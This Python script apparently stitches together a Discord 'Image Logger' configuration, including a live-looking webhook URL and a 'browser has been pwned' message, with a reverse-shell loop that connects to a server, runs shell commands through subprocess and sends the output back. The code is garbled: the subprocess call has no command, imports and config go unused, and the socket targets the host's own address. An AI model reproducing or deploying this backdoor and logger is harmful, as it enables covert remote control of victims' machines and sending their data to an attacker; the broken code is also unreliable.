from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser, webbrowser
import sys
import socket
import subprocess
import os
import time
import platform
import tempfile
import webbrowser

config = {
  "webhook": "https://discord.com/api/webhooks/1335558225692463124/N8UL3FVP12SJITgxLvkaBiqXm1ULRz-iXOBs7-PF91cL7Izdio7D7yjtdHNb7jJGiR-m",
  "imageArgument": True,
  "username": "Image Logger", 
  "color": 0x00FFFF,
  "message": {
        "doMessage": False, 
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", 
        "richMessage": True, 
  },
  "linkAlerts": True,
}

def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(0)
    try:
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = '127.0.0.1'  
    finally:
        s.close()
    return ip


SERVER_IP = get_ip()
PORT = 7777

print(f"Server IP: {SERVER_IP}, Port: {PORT}")

def start_script():
    s = socket.socket()
    s.connect((SERVER_IP, PORT))
    msg = s.recv(1024).decode()
    print('[*] server: ', msg)

    while True:

        try:
            result = subprocess.check_output(stderr=subprocess.STDOUT, shell=True)
        except Exception as e:
            result = str(e).encode()

        if len(result) == 0:
            result = '[+] Executed Successfully'.encode()

        s.send(result)

    s.close()

if __name__ == '__main__':
    while True:
        try:
            start_script()
        except Exception as e:
            print(f"[!] Error: {e}")
            time.sleep(5)  
            continue  
